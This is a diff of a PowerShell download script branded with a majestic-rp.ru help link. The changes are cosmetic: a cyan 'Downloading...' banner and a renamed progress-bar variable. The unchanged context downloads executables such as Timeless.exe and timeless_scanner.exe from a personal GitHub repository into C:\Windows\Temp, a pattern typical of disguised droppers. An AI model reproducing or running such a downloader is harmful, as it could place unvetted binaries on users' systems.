@@ -1,6 +1,15 @@
 Write-Host "Need help? Check our homepage: " -NoNewline
 Write-Host "majestic-rp.ru" -ForegroundColor Green
 
+$width = $Host.UI.RawUI.WindowSize.Width
+if ($width -lt 1) { $width = 80 }
+
+Write-Host (" " * $width) -BackgroundColor Cyan
+Write-Host ("Downloading...").PadRight($width) -BackgroundColor Cyan -ForegroundColor White
+Write-Host ("    Please wait").PadRight($width) -BackgroundColor Cyan -ForegroundColor White
+Write-Host (" " * $width) -BackgroundColor Cyan
+Write-Host ""
+
 $downloads = @(
     @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
     @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
@@ -9,17 +18,17 @@ $downloads = @(
 
 function Show-Progress {
     param ([int]$Percent)
-    $width = 40
-    $filled = [int]($width * $Percent / 100)
-    $empty = $width - $filled
+    $barWidth = 40
+    $filled = [int]($barWidth * $Percent / 100)
+    $empty = $barWidth - $filled
     $bar = '#' * $filled + '-' * $empty
-    Write-Host "`r  Downloading... [$bar] $Percent%  " -NoNewline
+    Write-Host "`r  [$bar] $Percent%  " -NoNewline
 }
 
 $totalFiles = $downloads.Count
 $fileIndex = 0
 
-Show-Progress 0  # <-- показывается сразу при запуске
+Show-Progress 0
 
 foreach ($item in $downloads) {
     try {
